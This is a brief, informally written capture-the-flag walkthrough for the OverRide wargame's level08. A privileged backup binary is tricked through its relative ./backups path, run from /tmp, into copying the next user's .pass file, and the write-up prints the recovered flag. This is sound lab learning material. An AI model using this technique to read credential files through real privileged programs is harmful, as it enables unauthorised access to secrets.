the file open ./backup and backup file pass in argument so is try with that 


RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08 

ih have canary and multiple thing so is hard to exploit


so let's try
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass


but is not possible to open the file 
because the directory not exist 
and i don't have the permission :
level08@OverRide:~/backups$ mkdir t
mkdir: cannot create directory `t': Permission denied

so i need to foun how to create ./backups/home/users/level09

and i found the solution because i /tmp is possible
and because IS RELATIVE ./backup is possible to use any folder !


so =>
mkdir -p /tmp/backups/home/users/level09/level09

let's try =>
level08@OverRide:/tmp$ mkdir -p /tmp/backups/home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass

and found the flag =>
cat /tmp/backups/home/users/level09/.pass



level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S


And i found the flag !